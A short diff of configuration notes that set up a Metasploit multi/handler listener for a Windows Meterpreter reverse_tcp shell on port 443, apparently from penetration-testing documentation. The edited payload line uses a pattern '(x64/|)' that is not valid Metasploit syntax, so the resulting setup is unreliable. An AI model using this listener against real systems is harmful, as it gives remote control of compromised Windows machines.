@@ -36,9 +36,7 @@ Configuration:
 
   - Listener:
     - use exploit/multi/handler
-    - # use for x64
-    - set PAYLOAD windows/x64/meterpreter/reverse_tcp
-    - # use for x86
+    - set PAYLOAD windows/(x64/|)meterpreter/reverse_tcp
     - set PAYLOAD windows/meterpreter/reverse_tcp
     - set LHOST 0.0.0.0
     - set LPORT 443
